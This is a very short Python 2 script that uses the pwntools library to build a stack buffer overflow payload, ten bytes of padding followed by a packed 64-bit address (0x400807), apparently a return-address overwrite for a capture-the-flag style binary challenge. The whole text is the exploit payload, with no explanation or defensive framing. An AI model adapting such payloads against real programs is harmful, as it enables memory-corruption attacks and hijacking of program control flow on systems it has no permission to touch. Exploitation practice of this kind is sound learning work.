from pwn import *

val = 'a'*10 + p64(0x0000000000400807)

print val
